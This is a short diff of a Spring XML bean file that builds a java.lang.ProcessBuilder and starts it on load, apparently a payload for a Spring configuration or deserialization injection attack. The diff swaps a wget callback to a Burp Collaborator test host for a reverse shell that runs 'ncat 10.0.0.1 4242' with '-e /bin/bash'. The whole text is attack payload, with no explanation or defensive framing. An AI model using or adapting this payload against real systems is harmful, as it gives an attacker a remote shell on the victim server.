@@ -2,8 +2,8 @@
   <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
     <constructor-arg>
       <list>
-        <value>wget</value>
-        <value>https://at7oyqz7nskqsxzsdj1o4dcd44awyl.burpcollaborator.net</value>
+        <value>ncat 10.0.0.1 4242</value>
+        <value>-e /bin/bash</value>
       </list>
     </constructor-arg>
   </bean>
